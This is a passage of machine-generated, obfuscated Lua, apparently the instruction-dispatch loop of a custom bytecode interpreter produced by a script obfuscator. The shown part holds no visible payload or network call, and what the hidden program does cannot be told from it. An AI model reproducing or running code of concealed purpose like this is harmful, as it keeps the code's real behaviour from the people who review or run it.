                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
              elseif (Enum > 135) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 142) then
              if (Enum <= 139) then
                if (Enum <= 137) then
                  local Edx;
                  local Results, Limit;
                  local A;
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                elseif (Enum == 138) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 140) then
                Stk[Inst[2]] = Inst[3];
              elseif (Enum == 141) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] + Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 145) then
              if (Enum <= 143) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum == 144) then
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 147) then
              if (Enum == 146) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum > 148) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local B;
              local A;
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            end
          elseif (Enum <= 174) then
            if (Enum <= 161) then
              if (Enum <= 155) then
                if (Enum <= 152) then
                  if (Enum <= 150) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum > 151) then
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  else
                    local B;
                    local A;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if Stk[Inst[2]] then
                      VIP = VIP + 1;
                    else
                      VIP = Inst[3];
                    end
                  end
                elseif (Enum <= 153) then
                  local B;
                  local A;
                  Stk[Inst[2]] = Upvalues[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Upvalues[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                elseif (Enum == 154) then
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 158) then
                if (Enum <= 156) then
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum == 157) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
